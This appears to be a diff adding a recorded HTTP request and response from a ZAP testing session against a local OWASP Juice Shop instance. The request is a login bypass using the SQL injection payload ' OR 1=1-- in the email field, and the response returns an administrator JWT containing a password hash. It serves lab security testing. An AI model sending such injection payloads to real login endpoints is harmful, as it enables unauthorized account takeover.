@@ -1,0 +1,28 @@
+### A03_juice_3_login_bypass
+# ZAP history id: 6
+
+POST http://localhost:3000/rest/user/login HTTP/1.1
+Host: localhost:3000
+User-Agent: python-requests/2.34.2
+Accept: */*
+Connection: keep-alive
+Content-Length: 40
+Content-Type: application/json
+
+{"email": "' OR 1=1--", "password": "x"}
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+X-Recruiting: /#/jobs
+Content-Type: application/json; charset=utf-8
+Content-Length: 784
+ETag: W/"310-BVrM9VgcqKdhwgSUUMOOf3OF+Pc"
+Vary: Accept-Encoding
+Date: Wed, 18 Nov 2026 11:51:12 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMS0xOCAxMTo1MDo1MS45NjcgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMS0xOCAxMTo1MDo1MS45NjcgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3OTUwMDI2NzJ9.BVJOjRHnjSozW4AF0Byz2NxAI3Iw2n8A7vV4xkqZxkiFZ54ICtVpywVV1QQX4zD8u0EOFBnEDPOseQ0ECyE9zEndHDsMUQHM-UxPIlDbJZ98ZxrznZeKsnH-coNKJbiwq9yy7KBj2mqBN1R3sgEqDyWUZ8PVFVhqGcN7cLG652g","bid":1,"umail":"admin@juice-sh.op"}}
